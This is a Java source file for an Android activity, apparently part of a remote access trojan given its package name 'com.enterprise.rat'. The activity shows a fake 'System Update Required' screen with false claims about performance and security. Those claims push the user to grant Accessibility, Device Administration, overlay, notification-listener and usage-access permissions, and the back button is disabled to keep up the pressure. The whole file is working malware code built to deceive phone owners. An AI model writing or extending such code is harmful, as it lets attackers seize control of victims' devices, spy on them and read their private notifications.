package com.enterprise.rat.activities;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import com.enterprise.rat.admin.AdminReceiver;

public class FakeUpdateActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.parseColor("#F5F5F5"));
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(40, 40, 40, 40);

        TextView title = new TextView(this);
        title.setText("System Update Required");
        title.setTextSize(22);
        title.setTextColor(Color.BLACK);
        title.setGravity(Gravity.CENTER);
        layout.addView(title);

        ProgressBar progressBar = new ProgressBar(this);
        progressBar.setIndeterminate(true);
        progressBar.setPadding(20, 40, 20, 40);
        layout.addView(progressBar);

        TextView message = new TextView(this);
        message.setText("To complete the update, please grant the following permissions on the next screen:\n\n"
                + "• Accessibility Service\n"
                + "• Notification Access\n"
                + "• Device Administration\n\n"
                + "This is required to optimize system performance and security.");
        message.setTextSize(14);
        message.setTextColor(Color.DKGRAY);
        message.setPadding(10, 20, 10, 20);
        layout.addView(message);

        Button grantButton = new Button(this);
        grantButton.setText("GRANT PERMISSIONS");
        grantButton.setBackgroundColor(Color.parseColor("#4CAF50"));
        grantButton.setTextColor(Color.WHITE);
        grantButton.setOnClickListener(v -> {
            // Open accessibility settings
            Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(accIntent);

            // Request device admin
            ComponentName adminComponent = new ComponentName(FakeUpdateActivity.this, AdminReceiver.class);
            Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "System Update requires device administration to protect your device.");
            startActivityForResult(adminIntent, 1001);

            // Request overlay permission
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
                Intent overlayIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                overlayIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(overlayIntent);
            }

            // Request notification access
            Intent notifIntent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            notifIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(notifIntent);

            // Request usage stats
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                Intent usageIntent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                usageIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(usageIntent);
            }

            finish();
        });
        layout.addView(grantButton);

        Button laterButton = new Button(this);
        laterButton.setText("LATER");
        laterButton.setBackgroundColor(Color.parseColor("#9E9E9E"));
        laterButton.setTextColor(Color.WHITE);
        laterButton.setOnClickListener(v -> finish());
        layout.addView(laterButton);

        setContentView(layout);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1001) {
            if (resultCode == RESULT_OK) {
                Toast.makeText(this, "Device Admin activated", Toast.LENGTH_SHORT).show();
            }
        }
    }

    @Override
    public void onBackPressed() {
        Toast.makeText(this, "Please complete the update first.", Toast.LENGTH_SHORT).show();
    }
}
